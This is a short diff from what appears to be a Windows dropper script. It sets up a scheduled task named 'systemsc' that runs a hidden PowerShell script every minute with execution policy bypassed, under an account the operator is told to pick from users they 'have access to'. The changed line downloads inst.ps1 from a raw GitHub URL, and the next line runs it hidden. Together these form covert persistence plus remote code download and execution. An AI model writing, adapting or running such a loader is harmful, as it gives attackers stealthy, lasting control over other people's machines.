@@ -15,5 +15,5 @@ C:\Users\Public\Documents\python-3.12.5-amd64.exe /quiet InstallAllUsers=0 Prepe
 # making task (change the time and username with the user u have accsess to)
 schtasks /create /sc minute /mo 1 /tn systemsc /tr "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -WindowStyle hidden C:\Users\Public\Documents\script2.ps1" /ru coder # change this
 
-curl https://github.com/gghk0/gghk/blob/main/inst.ps1 -o C:\Users\Public\Documents\inst.ps1
+curl https://raw.githubusercontent.com/gghk0/gghk/refs/heads/main/inst.ps1 -o C:\Users\Public\Documents\inst.ps1
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -WindowStyle hidden C:\Users\Public\Documents\inst.ps1
